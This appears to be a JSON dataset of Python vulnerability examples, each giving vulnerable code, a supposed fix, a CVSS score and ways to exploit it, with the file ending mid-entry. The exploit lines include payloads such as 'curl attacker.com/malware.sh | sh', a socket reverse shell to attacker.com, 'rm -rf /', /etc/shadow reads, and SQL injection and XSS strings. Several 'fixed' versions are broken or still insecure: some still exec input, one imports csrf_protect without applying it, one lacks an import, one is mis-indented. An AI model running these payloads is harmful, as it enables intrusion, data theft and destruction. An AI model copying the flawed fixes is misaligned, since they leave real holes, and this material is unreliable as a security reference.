{
    "python_0": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \"\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\"Invalid path\")",
        "cvss_score": 6.5,
        "fixed_code": "import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    safe_path = os.path.join(base_directory, file_path.lstrip('/'))\\n    if os.path.commonprefix([os.path.abspath(safe_path), os.path.abspath(base_directory)]) != os.path.abspath(base_directory):\\n        raise ValueError(\"Invalid path\")\\n    with open(safe_path, 'r') as file:\\n        return file.read()",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the /etc/passwd file.",
            "They could use '../../secret/key.txt' to access files in parent directories.",
            "Input like '../../../../var/log/auth.log' might leak authentication logs."
        ]
    },
    "python_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def login(self, username, password):\n        return username == \"admin\" and password == \"password123\"",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = self.hash_password(password)\n    \n    def hash_password(self, password):\n        import hashlib\n        return hashlib.sha256(password.encode()).hexdigest()\n    \n    def login(self, username, password):\n        hashed_input_password = self.hash_password(password)\n        return self.username == username and self.password == hashed_input_password",
        "exploit_ways": [
            "An attacker can use the hardcoded credentials 'admin'/'password123' to gain unauthorized access.",
            "By using brute force, an attacker could try common passwords to find the correct login.",
            "If user enumeration is possible, attackers may target known usernames like 'admin'."
        ]
    },
    "python_2": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "# Python example\ndef obfuscated_eval(encoded_command):\n    import base64\n    exec(base64.b64decode(encoded_command).decode('utf-8'))",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef safe_obfuscated_eval(encoded_command):\n    import base64\n    command = base64.b64decode(encoded_command).decode('utf-8')\n    allowed_commands = ['ls', 'whoami']\n    if any(command.startswith(cmd) for cmd in allowed_commands):\n        exec(command)\n    else:\n        print(\"Command not allowed\")",
        "exploit_ways": [
            "An attacker can encode a command like 'rm -rf /' and pass it to obfuscated_eval to delete system files.",
            "Encoded command 'curl attacker.com/malware.sh | sh' can be used to execute remote malicious code.",
            "Chain commands such as 'ls; cat /etc/passwd' encoded and passed to exploit for leaking sensitive information."
        ]
    },
    "python_3": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import subprocess\nclass VulnerableClass:\n    def execute_command(self, cmd):\n        result = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, error = result.communicate()\n        if error:\n            return f'Error: {error.decode()}'\n        else:\n            return f'Result: {output.decode()}'",
        "cvss_score": 7.5,
        "fixed_code": "import subprocess\nfrom shlex import split\nclass SecureClass:\n    def execute_command(self, cmd):\n        safe_cmd = split(cmd)\n        result = subprocess.Popen(safe_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, error = result.communicate()\n        if error:\n            return f'Error: {error.decode()}'\n        else:\n            return f'Result: {output.decode()}'",
        "exploit_ways": [
            "An attacker can inject 'ls; rm -rf /' to delete system files after listing contents.",
            "They could use 'whoami' followed by other commands like '; curl http://attacker.com/shell.sh | bash' to download and execute a shell script.",
            "By using 'ps aux', an attacker can list running processes, then append '; killall -9 appname' to terminate specific applications."
        ]
    },
    "python_4": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "# Python example\nimport sqlite3\ndef fetch_user_data(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = '\" + user_id + \"'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    conn.close()\n    return result",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nimport sqlite3\ndef fetch_user_data(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = ?\"\n    cursor.execute(query, (user_id,))\n    result = cursor.fetchall()\n    conn.close()\n    return result",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve data for all users.",
            "They could use a UNION SELECT statement to extract sensitive information from other tables.",
            "Input like '; DROP TABLE users' might be used to delete the users table."
        ]
    },
    "python_5": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, request, redirect\napp = Flask(__name__)\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Simulate transferring funds\n    print(f'Transferring {amount} to {recipient}')\n    return redirect('/')",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nfrom flask import Flask, request, redirect, session, render_template_string\nimport os\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        form_token = request.form.get('csrf_token')\n        session_token = session.pop('csrf_token', None)\n        if not (form_token and form_token == session_token):\n            return 'Invalid CSRF token', 403\n        amount = request.form['amount']\n        recipient = request.form['recipient']\n        # Simulate transferring funds\n        print(f'Transferring {amount} to {recipient}')\n        return redirect('/')\n    session['csrf_token'] = os.urandom(24).hex()\n    form_html = \"\"\"\n<form action=\"/transfer\" method=\"post\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token }}\">\n  Amount: <input type=\"text\" name=\"amount\"><br>\n  Recipient: <input type=\"text\" name=\"recipient\"><br>\n  <input type=\"submit\" value=\"Transfer\">\n</form>\"\"\"\n    return render_template_string(form_html, csrf_token=session['csrf_token'])",
        "exploit_ways": [
            "An attacker can craft a malicious form that submits a transfer request to the victim's browser without their knowledge.",
            "By tricking the user into visiting a crafted URL or clicking on a link, an attacker can execute unauthorized transactions in the name of the user.",
            "Using social engineering tactics, attackers can prompt users to perform actions on a compromised website that triggers a CSRF attack."
        ]
    },
    "python_6": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def authenticate(self, input_username, input_password):\n        if input_username == self.username and input_password == self.password:\n            return True\n        else:\n            return False",
        "cvss_score": 7.5,
        "fixed_code": "class UserAuth:\n    import bcrypt\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\n\n    def authenticate(self, input_username, input_password):\n        return self.username == input_username and bcrypt.checkpw(input_password.encode('utf-8'), self.password_hash)",
        "exploit_ways": [
            "An attacker with knowledge of the username could brute force the password.",
            "If the password is weak or reused, it can be easily guessed or cracked using rainbow tables.",
            "An insider or malicious actor with access to the codebase could directly read the stored password and authenticate."
        ]
    },
    "python_7": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "# Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = \" + user_id\n    cursor.execute(query)\n    return cursor.fetchall()",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = ?\"\n    cursor.execute(query, (user_id,))\n    return cursor.fetchall()",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "Using a payload like '1; DROP TABLE users;' could delete the entire users table.",
            "Inputting '1 UNION SELECT username, password FROM admin_table' may expose sensitive admin credentials."
        ]
    },
    "python_8": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\\nimport hashlib\\ndef authenticate(username, password):\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and stored_password_hash == password_hash:\\n        return True\\n    else:\\n        return False",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$KIXcVnWqG4jZr0sNlXkE/uPpA3yH0mOvTJ0C5w6R9UxQYRYh8zV3e' # bcrypt hash of 'password123'\\n    password_hash = bcrypt.hashpw(password.encode(), stored_password_hash)\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    else:\\n        return False",
        "exploit_ways": [
            "An attacker could use a rainbow table to find the password for the MD5 hash.",
            "Since the hash is hardcoded, if the code is obtained, the hash can be cracked offline.",
            "If an attacker gains access to the source code, they can easily extract the admin credentials."
        ]
    },
    "python_9": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    if '..' not in filename and '.py' not in filename:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'",
        "cvss_score": 6.5,
        "fixed_code": "import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    allowed_files = [f for f in os.listdir('data') if not f.endswith('.py')]\n    if filename in allowed_files:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'",
        "exploit_ways": [
            "User could input '../../../../etc/passwd' to read the system's passwd file.",
            "Could use '../..' to traverse directories and access files outside the intended directory.",
            "If other sensitive files are present, they can be accessed by manipulating the filename parameter."
        ]
    },
    "python_10": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "from flask import Flask, request, redirect\r\napp = Flask(__name__)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    new_email = request.form['email']\r\n    user_id = request.cookies.get('user_id')\r\n    if user_id:\r\n        # Simulate database update\r\n        print(f\"Updating email for user {user_id} to {new_email}\")\r\n        return redirect('/profile')\r\n    else:\r\n        return 'User not logged in', 401\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)",
        "cvss_score": 6.8,
        "fixed_code": "from flask import Flask, request, redirect, session\r\nimport os\r\napp = Flask(__name__)\r\napp.secret_key = os.urandom(24)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    if 'csrf_token' in session and request.form['csrf_token'] == session['csrf_token']:\r\n        new_email = request.form['email']\r\n        user_id = request.cookies.get('user_id')\r\n        if user_id:\r\n            # Simulate database update\r\n            print(f\"Updating email for user {user_id} to {new_email}\")\r\n            return redirect('/profile')\r\n    return 'Invalid CSRF token', 403\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can craft a malicious web page that submits a form to change the victim's email address without their consent.",
            "They could use JavaScript in a phishing email to automatically submit a request to change the email when the user visits a compromised site while logged into the application.",
            "The attacker could generate a series of such requests targeting multiple users to\u6279\u91cf change their email addresses."
        ]
    },
    "python_11": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "# Python example\ndef read_file(filename):\n    with open(filename, 'r') as file:\n        return file.read()\n\nprint(read_file(input(\"Enter filename: \")))",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef read_file(filename):\n    import os\n    safe_path = os.path.join(os.getcwd(), 'allowed_directory', filename)\n    if not os.path.commonpath([os.path.abspath(safe_path), os.path.abspath('allowed_directory')]) == os.path.abspath('allowed_directory'):\n        raise ValueError(\"Access denied\")\n    with open(safe_path, 'r') as file:\n        return file.read()\n\nprint(read_file(input(\"Enter filename: \")))",
        "exploit_ways": [
            "An attacker could input \"../etc/passwd\" to read sensitive system files.",
            "Could use relative paths like \"../../flag.txt\" to access files outside the intended directory.",
            "Inputting a crafted path with null bytes or other encoding tricks might bypass simple validation."
        ]
    },
    "python_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "def transfer_funds(request):\n    if request.method == 'POST':\n        amount = request.POST.get('amount')\n        recipient = request.POST.get('recipient')\n        # Simulate a fund transfer\n        print(f'Transferring {amount} to {recipient}')",
        "cvss_score": 8.5,
        "fixed_code": "from django.views.decorators.csrf import csrf_protect\ndef transfer_funds(request):\n    if request.method == 'POST':\n        amount = request.POST.get('amount')\n        recipient = request.POST.get('recipient')\n        # Simulate a fund transfer\n        print(f'Transferring {amount} to {recipient}')",
        "exploit_ways": [
            "An attacker could craft a malicious link or form that, when visited by the user, transfers funds without their consent.",
            "By using social engineering tactics, an attacker can trick users into clicking on a crafted URL that executes a CSRF attack and transfers money from their account to the attacker's account.",
            "The attacker can create a hidden iframe in another website that submits a POST request to the vulnerable application, exploiting the user's authenticated session."
        ]
    },
    "python_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def login(username, password):\n    if username == \"admin\" and password == \"password123\":\n        return True\n    else:\n        return False",
        "cvss_score": 6.5,
        "fixed_code": "from werkzeug.security import check_password_hash\n\ndef hash_password(password):\n    # In practice, use a strong hashing function like bcrypt\n    return generate_password_hash(password)\n\ndef verify_password(stored_password, provided_password):\n    return check_password_hash(stored_password, provided_password)\n\nadmin_password_hash = hash_password('password123')\ndef login(username, password):\n    if username == 'admin' and verify_password(admin_password_hash, password):\n        return True\n    else:\n        return False",
        "exploit_ways": [
            "An attacker can easily guess the default credentials (admin/password123).",
            "If the hash function is weak or known, they could try brute-forcing the password.",
            "The hardcoded password makes it easy for attackers to gain unauthorized access if they get the source code."
        ]
    },
    "python_14": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\\nimport hashlib\\n\\ndef authenticate(username, password):\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\n        return True\\n    return False",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$84FZqLwPvRc6CJlXpZ30aeG7fDdK9iXuS5eVjU0tT.ao.GkN/6HPS'  # bcrypt hash for 'password'\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    return False",
        "exploit_ways": [
            "An attacker can brute-force the password since MD5 is a fast hashing algorithm.",
            "Using rainbow table attacks, an attacker can quickly reverse-engineer the hashed password '5f4dcc3b5aa765d61d8327deb882cf99'.",
            "An attacker could try common default passwords or patterns to gain access."
        ]
    },
    "python_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\nclass VulnerableClass:\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('touch /tmp/exploit')\",))",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\nclass SafeClass:\n    def __reduce__(self):\n        # Secure method that does not execute arbitrary code\n        return (str, ('SafeObject',))",
        "exploit_ways": [
            "An attacker could deserialize a malicious payload to execute arbitrary commands on the server.",
            "Could use this vulnerability to create, modify, or delete files on the system.",
            "Potential for executing remote code if the deserialized data can be controlled by an external actor."
        ]
    },
    "python_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\ndef generate_csrf_token():\n    return 'random_token_here'\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        recipient = request.form['recipient']\n        amount = request.form['amount']\n        # Simulate a bank transfer\n        print(f'Transferring {amount} to {recipient}')\n        return render_template_string('<h1>Transfer successful</h1>')\n    else:\n        token = generate_csrf_token()\n        return render_template_string('<form method=\"post\" action=\"/transfer\"><input type=\"hidden\" name=\"csrf_token\" value=\"{{token}}\"><input type=\"text\" name=\"recipient\"><input type=\"number\" name=\"amount\"><button type=\"submit\">Transfer</button></form>')",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nfrom flask import Flask, request, render_template_string, session\napp = Flask(__name__)\napp.secret_key = 'super_secret_key'\ndef generate_csrf_token():\n    if '_csrf_token' not in session:\n        from os import urandom\n        session['_csrf_token'] = urandom(24).hex()\n    return session['_csrf_token']\ndef valid_csrf(request):\n    token = session.pop('_csrf_token', None)\n    if not token or token != request.form.get('csrf_token'):\n        return False\n    return True\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        if not valid_csrf(request):\n            return render_template_string('<h1>Invalid CSRF token</h1>'), 403\n        recipient = request.form['recipient']\n        amount = request.form['amount']\n        # Simulate a bank transfer\n        print(f'Transferring {amount} to {recipient}')\n        return render_template_string('<h1>Transfer successful</h1>')\n    else:\n        token = generate_csrf_token()\n        return render_template_string('<form method=\"post\" action=\"/transfer\"><input type=\"hidden\" name=\"csrf_token\" value=\"{{token}}\"><input type=\"text\" name=\"recipient\"><input type=\"number\" name=\"amount\"><button type=\"submit\">Transfer</button></form>')",
        "exploit_ways": [
            "An attacker can create a malicious webpage that, when visited by an authenticated user, sends a request to the /transfer endpoint without their knowledge.",
            "Using social engineering, attackers can trick users into clicking on links or submitting forms hosted on the attacker's site, which automatically includes the CSRF token from the victim's session cookie.",
            "An attacker could send crafted HTTP requests with JavaScript in phishing emails that execute unauthorized actions on behalf of the user if they are logged into the application."
        ]
    },
    "python_17": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class UserSession:\n    def __init__(self, user_id):\n        self.user_id = user_id\n\n    def transfer_funds(self, amount, recipient):\n        if not self.is_authenticated():\n            raise Exception('User not authenticated')\n        # Simulate fund transfer\n        print(f'Transferring {amount} to {recipient}')\n\n    def is_authenticated(self):\n        return True  # This should check for actual authentication",
        "cvss_score": 6.5,
        "fixed_code": "class UserSession:\n    def __init__(self, user_id, csrf_token):\n        self.user_id = user_id\n        self.csrf_token = csrf_token\n\n    def transfer_funds(self, amount, recipient, token):\n        if not self.is_authenticated() or token != self.csrf_token:\n            raise Exception('User not authenticated or invalid CSRF token')\n        # Simulate fund transfer\n        print(f'Transferring {amount} to {recipient}')\n\n    def is_authenticated(self):\n        return True  # This should check for actual authentication",
        "exploit_ways": [
            "An attacker could craft a malicious web page that, when visited by an authenticated user, sends a request to transfer funds without their knowledge.",
            "Using social engineering tactics, attackers can trick users into clicking links or submitting forms that contain malicious CSRF tokens.",
            "If the CSRF token is predictable or reused, an attacker might guess or reuse it to perform unauthorized actions on behalf of the user."
        ]
    },
    "python_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "# Python example\\nclass CommandExecutor:\\n    def execute(self, command):\\n        eval(command)",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\\nclass SafeCommandExecutor:\\n    def execute(self, command):\\n        if command in ['allowed_command1', 'allowed_command2']:\\n            exec(command)\\n        else:\\n            raise ValueError('Command not allowed')",
        "exploit_ways": [
            "An attacker can input '__import__(\"os\").system(\"rm -rf /\")' to delete all files.",
            "Could use '\"__import__(\\\"subprocess\\\").check_output(\\\"whoami\\\")\"' to leak the current user.",
            "Malicious code like '\"__import__(\\\"socket\\\").socket().connect((\\\"attacker.com\\\", 1234))\"' can establish a reverse shell."
        ]
    },
    "python_19": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    return render_template_string(f'Hello {name}!')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 6.1,
        "fixed_code": "from flask import Flask, request, escape, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    escaped_name = escape(name)\n    return render_template_string(f'Hello {escaped_name}!')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can input '<script>alert(\\'XSS\\')</script>' to trigger a pop-up in the user's browser.",
            "By using '<img src=x onerror=alert(1)>', an attacker could execute arbitrary JavaScript code if rendered in another user's context.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click here</a>' can steal cookies or other sensitive data from a victim's browser."
        ]
    },
    "python_20": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "# Python example\ndef complex_unsafe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=True)",
        "cvss_score": 8.8,
        "fixed_code": "# Python example\ndef complex_safe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=False)",
        "exploit_ways": [
            "An attacker could inject '; rm -rf /' to delete all files on the system.",
            "Could use '; wget http://attacker.com/malware.sh -O - | sh' to download and execute malicious script.",
            "Chaining commands like '; cat /etc/passwd' can leak sensitive information."
        ]
    },
    "python_21": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import os\n\ndef execute_command(command):\n    try:\n        # Log command execution\n        with open(\"/var/log/command_log.txt\", \"a\") as log_file:\n            log_file.write(f\"Executing: {command}\\n\")\n        # Execute the command\n        os.system(command)\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a command to execute: \")\n    execute_command(user_input)",
        "cvss_score": 8.2,
        "fixed_code": "import os\nimport subprocess\n\ndef execute_command(command):\n    try:\n        # Log command execution\n        with open(\"/var/log/command_log.txt\", \"a\") as log_file:\n            log_file.write(f\"Executing: {command}\\n\")\n        # Execute the command safely\n        subprocess.run(command, shell=False)\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a command to execute: \")\n    execute_command([user_input])",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete system files with elevated privileges.",
            "Could use 'sudo su -' followed by password guessing to gain root access.",
            "Could chain commands like 'id; sudo cat /etc/shadow' to leak sensitive data."
        ]
    },
    "python_22": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    conn.close()\n    return user",
        "cvss_score": 7.5,
        "fixed_code": "import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username=?\"\n    cursor.execute(query, (username,))\n    user = cursor.fetchone()\n    conn.close()\n    return user",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use 'UNION SELECT' to extract data from other tables.",
            "Input like '; DROP TABLE users' can delete critical data."
        ]
    },
    "python_23": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\ndef load_config(serialized):\n    import pickle\n    config = pickle.loads(serialized)\n    return config",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\ndef load_config(serialized):\n    import json\n    try:\n        config = json.loads(serialized)\n    except json.JSONDecodeError as e:\n        raise ValueError(\"Invalid serialized data\") from e\n    return config",
        "exploit_ways": [
            "An attacker can serialize malicious Python objects to execute arbitrary code.",
            "They can inject payloads that perform unauthorized actions, such as deleting files or accessing sensitive data.",
            "Crafted input could lead to a denial of service by causing the application to hang indefinitely."
        ]
    },
    "python_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\nclass SecureObject:\n    def __init__(self, data):\n        self.data = data\n    def serialize(self):\n        import pickle\n        return pickle.dumps(self)\n    @staticmethod\ndef deserialize(serialized_data):\n        import pickle\n        return pickle.loads(serialized_data)",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nclass SecureObject:\n    def __init__(self, data):\n        self.data = data\n    def serialize(self):\n        import json\n        return json.dumps(self.__dict__)\n    @staticmethod\ndef deserialize(serialized_data):\n        import json\n        data = json.loads(serialized_data)\n        return SecureObject(data[\"data\"])",
        "exploit_ways": [
            "An attacker can craft a malicious payload to execute arbitrary code during deserialization.",
            "Could exploit the vulnerability to perform remote code execution by injecting a payload that executes system commands.",
            "Attacker may inject a payload that leads to denial of service by causing excessive resource consumption."
        ]
    },
    "python_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "import logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\ndef log_user_data(user_id, user_email):\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')",
        "cvss_score": 2.1,
        "fixed_code": "import logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\ndef log_user_data(user_id):\n    logging.info(f'User ID: {user_id}')",
        "exploit_ways": [
            "An attacker with access to the logs could retrieve sensitive user emails.",
            "If the system is compromised, an attacker could use the logs for further attacks on users.",
            "The logged information can be used in social engineering attempts."
        ]
    },
    "python_26": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "# Python example\ndef race_condition_example():\n    import threading\n    counter = 0\n    def increment():\n        global counter\n        for _ in range(1000):\n            temp = counter\n            temp += 1\n            counter = temp\n    threads = [threading.Thread(target=increment) for _ in range(10)]\n    for thread in threads:\n        thread.start()\n    for thread in threads:\n        thread.join()\n    print(f\"Final counter value: {counter}\")",
        "cvss_score": 5.3,
        "fixed_code": "# Python example\ndef race_condition_example():\n    import threading\n    counter = 0\n    lock = threading.Lock()\n    def increment():\n        nonlocal counter\n        for _ in range(1000):\n            with lock:\n                temp = counter\n                temp += 1\n                counter = temp\n    threads = [threading.Thread(target=increment) for _ in range(10)]\n    for thread in threads:\n        thread.start()\n    for thread in threads:\n        thread.join()\n    print(f\"Final counter value: {counter}\")",
        "exploit_ways": [
            "An attacker can run the script multiple times to observe inconsistent final counter values due to race conditions.",
            "By scheduling other high-load processes, an attacker could exacerbate the race condition for less predictable results.",
            "Crafting a scenario where resources are locked elsewhere and timing attacks could be used to manipulate the state of the counter."
        ]
    },
    "python_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, render_template_string\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return render_template_string('<iframe src=\"https://malicious.com\" style=\"opacity:0;position:absolute;z-index:1000;width:100%;height:100%\"></iframe><h1>Welcome to our site!</h1>')",
        "cvss_score": 3.7,
        "fixed_code": "# Python example\nfrom flask import Flask, render_template_string\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return render_template_string('<h1>Welcome to our site!</h1><meta http-equiv=\"X-Frame-Options\" content=\"DENY\">')",
        "exploit_ways": [
            "An attacker could embed the vulnerable page in a frame and trick users into clicking on hidden elements.",
            "Malicious actors can exploit this by overlaying interactive buttons or links without user knowledge.",
            "Users might inadvertently perform actions like liking, sharing, or downloading content from a malicious site."
        ]
    },
    "python_28": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "# Python example\ndef send_response(user_input):\n    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \" + user_input\n    return response",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef send_response(user_input):\n    import urllib.parse\n    safe_user_input = urllib.parse.quote(user_input)\n    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \" + safe_user_input\n    return response",
        "exploit_ways": [
            "An attacker can input 'Username\\r\\nSet-Cookie: SessionID=malicious' to inject cookies.",
            "They could use '\\r\\nLocation: http://attacker.com' for a redirection attack.",
            "Input like '\\r\\nContent-Length: 0' to manipulate the response length."
        ]
    },
    "python_29": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "class SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if user_id not in self.sessions:\n            self.sessions[user_id] = session_id\n        return self.sessions[user_id]\n\n    def get_user(self, session_id):\n        for user_id, sid in self.sessions.items():\n            if sid == session_id:\n                return user_id\n        return None",
        "cvss_score": 4.0,
        "fixed_code": "import uuid\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        session_id = str(uuid.uuid4())\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        return self.sessions.get(session_id)",
        "exploit_ways": [
            "An attacker could set a fixed session ID before the user logs in, capturing their session once authenticated.",
            "By manipulating session IDs, an attacker might take over a legitimate user's session if they guess or predict the session identifier.",
            "Attacker can force a target user to use a specific session ID via various means like phishing links containing a predetermined session token."
        ]
    },
    "python_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "# Python example\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if session_id not in self.sessions:\n            self.sessions[session_id] = {\"user_id\": user_id}\n        return self.sessions[session_id]\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")",
        "cvss_score": 4.2,
        "fixed_code": "# Python example\nclass SessionManager:\n    import uuid\n\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        session_id = str(uuid.uuid4())\n        self.sessions[session_id] = {\"user_id\": user_id}\n        return session_id\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")",
        "exploit_ways": [
            "An attacker can provide a predetermined session ID to the server, hijacking an existing session if it exists.",
            "If the session ID is predictable or reused, attackers could guess and use valid session IDs to gain unauthorized access.",
            "By controlling the session ID assignment process on the client side, attackers might influence the server to associate their requests with legitimate sessions."
        ]
    },
    "python_31": {
        "vulnerability_type": "Clickjacking (Low Severity)",
